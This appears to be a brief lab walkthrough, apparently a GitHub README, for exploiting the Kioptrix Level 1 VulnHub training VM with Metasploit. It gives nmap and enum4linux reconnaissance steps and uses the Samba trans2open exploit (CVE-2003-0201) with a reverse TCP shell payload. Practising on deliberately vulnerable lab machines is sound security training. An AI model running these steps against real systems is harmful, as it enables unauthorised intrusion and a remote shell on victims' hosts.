🖥️ Lab Setup
VirtualBox
Kali Linux VM
Kioptrix Level 1 Vulnhub VM

in here i will show you how to step by step exploit kioptrix level 1 with metasploit
- make sure you have kioptrix running on your virtual machine https://www.vulnhub.com/entry/kioptrix-level-1-1,22/
- once you start the kioptrix login with username: john 
                                         password: TwoCows2
- check if it haverespon with ping 8.8.8.8
- open terminal in linux and check if the target sytem is already exist with arp-scan -l
- use nmap on 192.168.29.133 (nmap -T4 -p- -A 192.168.29.133)
- scan with nbt(ip target)
- then enum4linux(ip target)
- open metasploit (msfconsole)
- search 2003-0201
- use 1 
- set RHOST 192.168.29.133
- set payload linux/x86/shell_reverse_tcp
- run 
- preview ![Screenshot (152)](https://github.com/Haydar13D/bypass-kioptrix-level1-with-metasploit/assets/152575800/09362c44-7d10-4d2a-b5ed-158cf676c44f)




